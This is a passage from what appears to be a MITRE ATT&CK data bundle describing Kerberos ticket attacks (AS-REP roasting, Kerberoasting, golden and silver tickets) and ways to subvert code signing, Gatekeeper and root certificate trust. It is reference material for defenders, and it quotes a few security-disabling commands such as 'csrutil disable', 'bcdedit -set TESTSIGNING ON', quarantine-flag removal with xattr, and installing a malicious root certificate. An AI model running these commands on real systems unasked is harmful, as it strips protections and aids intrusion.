href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Factivedirectory\u002Froasting-as-reps\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nPreauthentication offers protection against offline \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F002'\u003EPassword Cracking\u003C\u002Fa\u003E. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsocial.technet.microsoft.com\u002Fwiki\u002Fcontents\u002Farticles\u002F23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F002'\u003EPassword Cracking\u003C\u002Fa\u003E attacks similarly to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F003'\u003EKerberoasting\u003C\u002Fa\u003E and expose plaintext credentials. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Factivedirectory\u002Froasting-as-reps\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.stealthbits.com\u002Fcracking-active-directory-passwords-with-as-rep-roasting\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Factivedirectory\u002Froasting-as-reps\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.stealthbits.com\u002Fcracking-active-directory-passwords-with-as-rep-roasting\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCracked hashes may enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0003'\u003EPersistence\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0004'\u003EPrivilege Escalation\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0008'\u003ELateral Movement\u003C\u002Fa\u003E via access to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredsiege.com\u002Fkerberoast-slides'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Fa.external_references=[{source_name:b,external_id:Fb,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F004"},{source_name:"Harmj0y Roasting AS-REPs Jan 2017",url:"http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Factivedirectory\u002Froasting-as-reps\u002F",description:"HarmJ0y. (2017, January 17). Roasting AS-REPs. Retrieved August 24, 2020."},{source_name:"Microsoft Kerberos Preauth 2014",url:"https:\u002F\u002Fsocial.technet.microsoft.com\u002Fwiki\u002Fcontents\u002Farticles\u002F23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx",description:"Sanyal, M.. (2014, March 18). Kerberos Pre-Authentication: Why It Should Not Be Disabled. Retrieved August 25, 2020."},{source_name:"Stealthbits Cracking AS-REP Roasting Jun 2019",url:"https:\u002F\u002Fblog.stealthbits.com\u002Fcracking-active-directory-passwords-with-as-rep-roasting\u002F",description:"Jeff Warren. (2019, June 27). Cracking Active Directory Passwords with AS-REP Roasting. Retrieved August 24, 2020."},{description:Fc,source_name:Fd,url:Fe},{url:gA,description:gB,source_name:gC},{url:gx,description:gy,source_name:gz},{source_name:"Microsoft 4768 TGT 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fauditing\u002Fevent-4768",description:"Microsoft. (2017, April 19). 4768(S, F): A Kerberos authentication ticket (TGT) was requested. Retrieved August 24, 2020."}];Fa["subtechnique-of"]=bf;Ff.id=Fg;Ff["object-type"]=a;Ff.name="Golden Ticket";Ff.description="Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=1640'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Golden tickets enable adversaries to generate authentication material for any account in Active Directory.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcert.europa.eu\u002Fstatic\u002FWhitePapers\u002FUPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=1515'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=483'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The KRBTGT password hash may be obtained using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E and privileged access to a domain controller.";Ff.external_references=[{source_name:b,external_id:Fg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F001"},{url:"https:\u002F\u002Fadsecurity.org\u002F?p=1640",description:"Metcalf, S. (2015, August 7). Kerberos Golden Tickets are Now More Golden. Retrieved December 1, 2017.",source_name:"AdSecurity Kerberos GT Aug 2015"},{url:gu,description:gv,source_name:gw},{url:cN,description:cO,source_name:cP},{description:"Sean Metcalf. (2014, November 10). Kerberos & KRBTGT: Active Directory’s Domain Kerberos Service Account. Retrieved January 30, 2020.",url:"https:\u002F\u002Fadsecurity.org\u002F?p=483",source_name:"ADSecurity Kerberos and KRBTGT"},{source_name:EW,url:EX,description:EY},{source_name:EZ,url:E_,description:E$}];Ff["subtechnique-of"]=bf;Fh.id=Fi;Fh["object-type"]=a;Fh.name="Kerberoasting";Fh.description="Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110'\u003EBrute Force\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Fdata\u002Fmodule_source\u002Fcredentials\u002FInvoke-Kerberoast.ps1'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2293'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Fmotiba\u002F2018\u002F02\u002F23\u002Fdetecting-kerberoasting-activity-using-azure-security-center\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms677949.aspx'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsocial.technet.microsoft.com\u002Fwiki\u002Fcontents\u002Farticles\u002F717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredsiege.com\u002Fkerberoast-slides'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fpowershell\u002Fkerberoasting-without-mimikatz\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Fdata\u002Fmodule_source\u002Fcredentials\u002FInvoke-Kerberoast.ps1'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2293'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110'\u003EBrute Force\u003C\u002Fa\u003E attacks that may expose plaintext credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2293'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Fdata\u002Fmodule_source\u002Fcredentials\u002FInvoke-Kerberoast.ps1'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fpowershell\u002Fkerberoasting-without-mimikatz\u002F'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis same attack could be executed using service tickets captured from network traffic.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2293'\u003E[13]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCracked hashes may enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0003'\u003EPersistence\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0004'\u003EPrivilege Escalation\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0008'\u003ELateral Movement\u003C\u002Fa\u003E via access to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredsiege.com\u002Fkerberoast-slides'\u003E[14]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Fh.external_references=[{source_name:b,external_id:Fi,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F003"},{external_id:"CAPEC-509",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F509.html"},{url:"https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Fdata\u002Fmodule_source\u002Fcredentials\u002FInvoke-Kerberoast.ps1",description:"EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.",source_name:"Empire InvokeKerberoast Oct 2016"},{url:gA,description:gB,source_name:gC},{url:gx,description:gy,source_name:gz},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms677949.aspx",description:"Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.",source_name:"Microsoft SPN"},{url:"https:\u002F\u002Fsocial.technet.microsoft.com\u002Fwiki\u002Fcontents\u002Farticles\u002F717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx",description:"Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.",source_name:"Microsoft SetSPN"},{description:Fc,source_name:Fd,url:Fe},{url:"https:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fpowershell\u002Fkerberoasting-without-mimikatz\u002F",description:"Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved March 23, 2018.",source_name:"Harmj0y Kerberoast Nov 2016"}];Fh["subtechnique-of"]=bf;Fj.id=Fk;Fj["object-type"]=a;Fj.name="Silver Ticket";Fj.description="Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2011'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=1515'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nPassword hashes for target services may be obtained using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F003'\u003EKerberoasting\u003C\u002Fa\u003E.";Fj.external_references=[{source_name:b,external_id:Fk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F002"},{source_name:"ADSecurity Silver Tickets",url:"https:\u002F\u002Fadsecurity.org\u002F?p=2011",description:"Sean Metcalf. (2015, November 17). How Attackers Use Kerberos Silver Tickets to Exploit Systems. Retrieved February 27, 2020."},{url:cN,description:cO,source_name:cP},{description:dj,url:dk,source_name:dl}];Fj["subtechnique-of"]=bf;Fx.id=Fy;Fx["object-type"]=a;Fx.name="Code Signing";Fx.description="Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCode_signing'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The certificates used during an operation may be created, acquired, or stolen by the adversary. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fwhy-you-shouldnt-completely-trust-files-signed-with-digital-certificates\u002F68593\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fhow-attackers-steal-private-keys-digital-certificates'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Unlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F001'\u003EInvalid Code Signature\u003C\u002Fa\u003E, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS\u002FOS X systems. It is not used on Linux due to the decentralized nature of the platform. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCode_signing'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. ";Fx.external_references=[{source_name:b,external_id:Fy,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F002"},{url:ff,description:fg,source_name:fh},{url:Fo,description:Fp,source_name:Fq},{url:Fr,description:Fs,source_name:Ft}];Fx["subtechnique-of"]=ae;Fz.id=FA;Fz["object-type"]=a;Fz.name="Code Signing Policy Modification";Fz.description="Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fhardware\u002Fdesign\u002Fdn653559(v=vs.85)?redirectedfrom=MSDN'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002Fdisabling_and_enabling_system_integrity_protection'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Finstalling-an-unsigned-driver-during-development-and-test'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002Fdisabling_and_enabling_system_integrity_protection'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1112'\u003EModify Registry\u003C\u002Fa\u003E, rebooting the computer in a debug\u002Frecovery mode, or by altering the value of variables in kernel memory.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fthe-testsigning-boot-configuration-option'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002Fdisabling_and_enabling_system_integrity_protection'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F08\u002Fhikit-rootkit-advanced-persistent-attack-techniques-part-2.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fhfiref0x\u002FTDL'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Examples of commands that can modify the code signing policy of a system include \u003Ccode\u003Ebcdedit.exe -set TESTSIGNING ON\u003C\u002Fcode\u003E on Windows and \u003Ccode\u003Ecsrutil disable\u003C\u002Fcode\u003E on macOS.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fthe-testsigning-boot-configuration-option'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002Fdisabling_and_enabling_system_integrity_protection'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog-assets.f-secure.com\u002Fwp-content\u002Fuploads\u002F2019\u002F10\u002F15163408\u002FBlackEnergy_Quedagh.pdf'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying \u003Ccode\u003Eg_CiOptions\u003C\u002Fcode\u003E to disable Driver Signature Enforcement, adversaries may conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1068'\u003EExploitation for Privilege Escalation\u003C\u002Fa\u003E using a signed, but vulnerable driver.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Facidbox-rare-malware\u002F'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fhfiref0x\u002FTDL'\u003E[13]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Fz.external_references=[{source_name:b,external_id:FA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F006"},{source_name:"Microsoft DSE June 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fhardware\u002Fdesign\u002Fdn653559(v=vs.85)?redirectedfrom=MSDN",description:"Microsoft. (2017, June 1). Digital Signatures for Kernel Modules on Windows. Retrieved April 22, 2021."},{source_name:"Apple Disable SIP",url:"https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002Fdisabling_and_enabling_system_integrity_protection",description:"Apple. (n.d.). Disabling and Enabling System Integrity Protection. Retrieved April 22, 2021."},{source_name:"Microsoft Unsigned Driver Apr 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Finstalling-an-unsigned-driver-during-development-and-test",description:"Microsoft. (2017, April 20). Installing an Unsigned Driver during Development and Test. Retrieved April 22, 2021."},{source_name:"Microsoft TESTSIGNING Feb 2021",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-hardware\u002Fdrivers\u002Finstall\u002Fthe-testsigning-boot-configuration-option",description:"Microsoft. (2021, February 15). Enable Loading of Test Signed Drivers. Retrieved April 22, 2021."},{source_name:"FireEye HIKIT Rootkit Part 2",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F08\u002Fhikit-rootkit-advanced-persistent-attack-techniques-part-2.html",description:"Glyer, C., Kazanciyan, R. (2012, August 22). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 2). Retrieved May 4, 2020."},{source_name:"GitHub Turla Driver Loader",url:"https:\u002F\u002Fgithub.com\u002Fhfiref0x\u002FTDL",description:"TDL Project. (2016, February 4). TDL (Turla Driver Loader). Retrieved April 22, 2021."},{url:"https:\u002F\u002Fblog-assets.f-secure.com\u002Fwp-content\u002Fuploads\u002F2019\u002F10\u002F15163408\u002FBlackEnergy_Quedagh.pdf",description:"F-Secure Labs. (2014). BlackEnergy & Quedagh: The convergence of crimeware and APT attacks. Retrieved March 24, 2016.",source_name:"F-Secure BlackEnergy 2014"},{source_name:sU,url:sV,description:sW}];Fz["subtechnique-of"]=ae;FB.id=FC;FB["object-type"]=a;FB.name="Gatekeeper Bypass";FB.description="Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called \u003Ccode\u003Ecom.apple.quarantine\u003C\u002Fcode\u003E. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, it is possible to avoid setting this flag using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E. This completely bypasses the built-in Gatekeeper check. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The presence of the quarantine flag can be checked by the xattr command \u003Ccode\u003Exattr \u002Fpath\u002Fto\u002FMyApp.app\u003C\u002Fcode\u003E for \u003Ccode\u003Ecom.apple.quarantine\u003C\u002Fcode\u003E. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, \u003Ccode\u003Esudo xattr -r -d com.apple.quarantine \u002Fpath\u002Fto\u002FMyApp.app\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fderflounder.wordpress.com\u002F2012\u002F11\u002F20\u002Fclearing-the-quarantine-extended-attribute-from-downloaded-applications\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.alienvault.com\u002Fblogs\u002Flabs-research\u002Foceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fcybercrime\u002F2015\u002F10\u002Fbypassing-apples-gatekeeper\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";FB.external_references=[{source_name:b,external_id:FC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F001"},{url:B,description:S,source_name:T},{url:"https:\u002F\u002Fderflounder.wordpress.com\u002F2012\u002F11\u002F20\u002Fclearing-the-quarantine-extended-attribute-from-downloaded-applications\u002F",description:"Rich Trouton. (2012, November 20). Clearing the quarantine extended attribute from downloaded applications. Retrieved July 5, 2017.",source_name:"Clearing quarantine attribute"},{url:nA,description:nB,source_name:nC},{url:"https:\u002F\u002Fblog.malwarebytes.com\u002Fcybercrime\u002F2015\u002F10\u002Fbypassing-apples-gatekeeper\u002F",description:"Thomas Reed. (2016, March 31). Bypassing Apple's Gatekeeper. Retrieved July 5, 2017.",source_name:"Bypassing Gatekeeper"}];FB["subtechnique-of"]=ae;FD.id=FE;FD["object-type"]=a;FD.name="Install Root Certificate";FD.description="Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FRoot_certificate'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Certificates are commonly used for establishing secure TLS\u002FSSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.trendmicro.com\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-finding-holes-operation-emmental.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware\u002Fadware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS\u002FSSL communications. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.kaspersky.com\u002Fblog\u002Flenovo-pc-with-adware-superfish-preinstalled\u002F7712\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and\u002For uncover artifacts of Persistence. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fcode-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn macOS, the Ay MaMi malware uses \u003Ccode\u003E\u002Fusr\u002Fbin\u002Fsecurity add-trusted-cert -d -r trustRoot -k \u002FLibrary\u002FKeychains\u002FSystem.keychain \u002Fpath\u002Fto\u002Fmalicious\u002Fcert\u003C\u002Fcode\u003E to 